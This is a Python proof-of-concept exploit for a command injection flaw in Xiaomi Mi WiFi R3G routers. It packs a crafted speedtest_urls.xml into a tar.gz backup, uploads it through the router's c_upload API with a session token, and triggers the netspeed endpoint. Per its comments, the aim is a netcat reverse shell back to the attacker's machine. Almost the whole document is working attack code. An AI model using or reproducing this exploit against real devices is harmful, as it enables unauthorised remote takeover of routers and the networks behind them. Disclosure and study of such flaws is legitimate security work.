#!/usr/bin/python
# There is a remote command execution vulnerability in Xiaomi Mi WiFi R3G before version stable 2.28.23.
# The backup file is in tar.gz format. After uploading, the application uses the tar zxf command to decompress,
# so you can control the contents of the files in the decompressed directory.
# In addition, the application's sh script for testing upload and download speeds will read the url list from /tmp/speedtest_urls.xml,
# and there is a command injection vulnerability.

# discoverer: UltramanGaia from Kap0k & Zhiniang Peng from Qihoo 360 Core Security


import os
import shutil
import tarfile
import requests

# this script is used to run start_shell.sh in nginx/html/, which starts a nc client connect to 10.32.0.148:4444(your local nc server)
# you need to change router_ip_address, stok in this file and 192.168.31.217(local ip) in speedtest_urls_template.xml

router_ip_address = "192.168.31.1"
stok = "69942cfec9c32d8eeb6a746e6f6637b0"


if os.path.exists("build"):
    shutil.rmtree("build")
os.makedirs("build")

# Make tar
with tarfile.open("build/payload.tar.gz", "w:gz") as tar:
    tar.add("speedtest_urls_template.xml", "speedtest_urls.xml")

# upload config file
print("start uploading config file...")
r1 = requests.post(
    "http://{}/cgi-bin/luci/;stok={}/api/misystem/c_upload".format(router_ip_address, stok),
    files={"image": open("build/payload.tar.gz", 'rb')}
)
print(r1.text)

# exec download speed test, exec command
print("start exec command...")
r2 = requests.get("http://{}/cgi-bin/luci/;stok={}/api/xqnetdetect/netspeed".format(router_ip_address, stok))
print(r2.text)
